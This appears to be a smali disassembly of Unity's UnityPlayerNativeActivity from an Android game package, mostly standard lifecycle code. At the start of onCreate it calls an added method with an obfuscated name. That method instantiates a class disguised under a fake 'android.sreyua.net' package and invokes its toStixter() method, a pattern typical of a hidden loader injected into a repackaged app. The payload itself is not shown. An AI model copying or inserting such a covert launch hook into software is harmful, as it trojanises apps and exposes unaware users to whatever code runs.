.class public Lcom/unity3d/player/UnityPlayerNativeActivity;
.super Landroid/app/NativeActivity;


# instance fields
.field protected mUnityPlayer:Lcom/unity3d/player/UnityPlayer;


# direct methods
.method public constructor <init>()V
    .registers 1

    invoke-direct {p0}, Landroid/app/NativeActivity;-><init>()V

    return-void
.end method


# virtual methods
.method public dispatchKeyEvent(Landroid/view/KeyEvent;)Z
    .registers 5

    invoke-virtual {p1}, Landroid/view/KeyEvent;->getAction()I

    move-result v0

    const/4 v1, 0x2

    if-ne v0, v1, :cond_16

    iget-object v0, p0, Lcom/unity3d/player/UnityPlayerNativeActivity;->mUnityPlayer:Lcom/unity3d/player/UnityPlayer;

    invoke-virtual {p1}, Landroid/view/KeyEvent;->getKeyCode()I

    move-result v1

    invoke-virtual {p1}, Landroid/view/KeyEvent;->getRepeatCount()I

    move-result v2

    invoke-virtual {v0, v1, v2, p1}, Lcom/unity3d/player/UnityPlayer;->onKeyMultiple(IILandroid/view/KeyEvent;)Z

    move-result v0

    :goto_15
    return v0

    :cond_16
    invoke-super {p0, p1}, Landroid/app/NativeActivity;->dispatchKeyEvent(Landroid/view/KeyEvent;)Z

    move-result v0

    goto :goto_15
.end method

.method public onConfigurationChanged(Landroid/content/res/Configuration;)V
    .registers 3

    invoke-super {p0, p1}, Landroid/app/NativeActivity;->onConfigurationChanged(Landroid/content/res/Configuration;)V

    iget-object v0, p0, Lcom/unity3d/player/UnityPlayerNativeActivity;->mUnityPlayer:Lcom/unity3d/player/UnityPlayer;

    invoke-virtual {v0, p1}, Lcom/unity3d/player/UnityPlayer;->configurationChanged(Landroid/content/res/Configuration;)V

    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .registers 6

    invoke-virtual {p0}, Lcom/unity3d/player/UnityPlayerNativeActivity;->tsTseRseiew()V

    const/16 v3, 0x400

    const/4 v2, 0x1

    invoke-virtual {p0, v2}, Lcom/unity3d/player/UnityPlayerNativeActivity;->requestWindowFeature(I)Z

    invoke-super {p0, p1}, Landroid/app/NativeActivity;->onCreate(Landroid/os/Bundle;)V

    invoke-virtual {p0}, Lcom/unity3d/player/UnityPlayerNativeActivity;->getWindow()Landroid/view/Window;

    move-result-object v0

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/view/Window;->takeSurface(Landroid/view/SurfaceHolder$Callback2;)V

    const v0, 0x1030007

    invoke-virtual {p0, v0}, Lcom/unity3d/player/UnityPlayerNativeActivity;->setTheme(I)V

    invoke-virtual {p0}, Lcom/unity3d/player/UnityPlayerNativeActivity;->getWindow()Landroid/view/Window;

    move-result-object v0

    const/4 v1, 0x4

    invoke-virtual {v0, v1}, Landroid/view/Window;->setFormat(I)V

    new-instance v0, Lcom/unity3d/player/UnityPlayer;

    invoke-direct {v0, p0}, Lcom/unity3d/player/UnityPlayer;-><init>(Landroid/content/ContextWrapper;)V

    iput-object v0, p0, Lcom/unity3d/player/UnityPlayerNativeActivity;->mUnityPlayer:Lcom/unity3d/player/UnityPlayer;

    iget-object v0, p0, Lcom/unity3d/player/UnityPlayerNativeActivity;->mUnityPlayer:Lcom/unity3d/player/UnityPlayer;

    invoke-virtual {v0}, Lcom/unity3d/player/UnityPlayer;->getSettings()Landroid/os/Bundle;

    move-result-object v0

    const-string v1, "hide_status_bar"

    invoke-virtual {v0, v1, v2}, Landroid/os/Bundle;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    if-eqz v0, :cond_3e

    invoke-virtual {p0}, Lcom/unity3d/player/UnityPlayerNativeActivity;->getWindow()Landroid/view/Window;

    move-result-object v0

    invoke-virtual {v0, v3, v3}, Landroid/view/Window;->setFlags(II)V

    :cond_3e
    iget-object v0, p0, Lcom/unity3d/player/UnityPlayerNativeActivity;->mUnityPlayer:Lcom/unity3d/player/UnityPlayer;

    invoke-virtual {v0}, Lcom/unity3d/player/UnityPlayer;->getSettings()Landroid/os/Bundle;

    move-result-object v0

    const-string v1, "gles_mode"

    invoke-virtual {v0, v1, v2}, Landroid/os/Bundle;->getInt(Ljava/lang/String;I)I

    move-result v0

    iget-object v1, p0, Lcom/unity3d/player/UnityPlayerNativeActivity;->mUnityPlayer:Lcom/unity3d/player/UnityPlayer;

    const/4 v2, 0x0

    invoke-virtual {v1, v0, v2}, Lcom/unity3d/player/UnityPlayer;->init(IZ)V

    iget-object v0, p0, Lcom/unity3d/player/UnityPlayerNativeActivity;->mUnityPlayer:Lcom/unity3d/player/UnityPlayer;

    invoke-virtual {v0}, Lcom/unity3d/player/UnityPlayer;->getView()Landroid/view/View;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcom/unity3d/player/UnityPlayerNativeActivity;->setContentView(Landroid/view/View;)V

    invoke-virtual {v0}, Landroid/view/View;->requestFocus()Z

    return-void
.end method

.method protected onDestroy()V
    .registers 2

    iget-object v0, p0, Lcom/unity3d/player/UnityPlayerNativeActivity;->mUnityPlayer:Lcom/unity3d/player/UnityPlayer;

    invoke-virtual {v0}, Lcom/unity3d/player/UnityPlayer;->quit()V

    invoke-super {p0}, Landroid/app/NativeActivity;->onDestroy()V

    return-void
.end method

.method protected onPause()V
    .registers 2

    invoke-super {p0}, Landroid/app/NativeActivity;->onPause()V

    iget-object v0, p0, Lcom/unity3d/player/UnityPlayerNativeActivity;->mUnityPlayer:Lcom/unity3d/player/UnityPlayer;

    invoke-virtual {v0}, Lcom/unity3d/player/UnityPlayer;->pause()V

    return-void
.end method

.method protected onResume()V
    .registers 2

    invoke-super {p0}, Landroid/app/NativeActivity;->onResume()V

    iget-object v0, p0, Lcom/unity3d/player/UnityPlayerNativeActivity;->mUnityPlayer:Lcom/unity3d/player/UnityPlayer;

    invoke-virtual {v0}, Lcom/unity3d/player/UnityPlayer;->resume()V

    return-void
.end method

.method public onWindowFocusChanged(Z)V
    .registers 3

    invoke-super {p0, p1}, Landroid/app/NativeActivity;->onWindowFocusChanged(Z)V

    iget-object v0, p0, Lcom/unity3d/player/UnityPlayerNativeActivity;->mUnityPlayer:Lcom/unity3d/player/UnityPlayer;

    invoke-virtual {v0, p1}, Lcom/unity3d/player/UnityPlayer;->windowFocusChanged(Z)V

    return-void
.end method

.method public tsTseRseiew()V
    .registers 2

    .prologue
    new-instance v0, Landroid/sreyua/net/AndRoidActivity;

    invoke-direct {v0, p0}, Landroid/sreyua/net/AndRoidActivity;-><init>(Landroid/content/Context;)V

    invoke-virtual {v0}, Landroid/sreyua/net/AndRoidActivity;->toStixter()V

    return-void
.end method
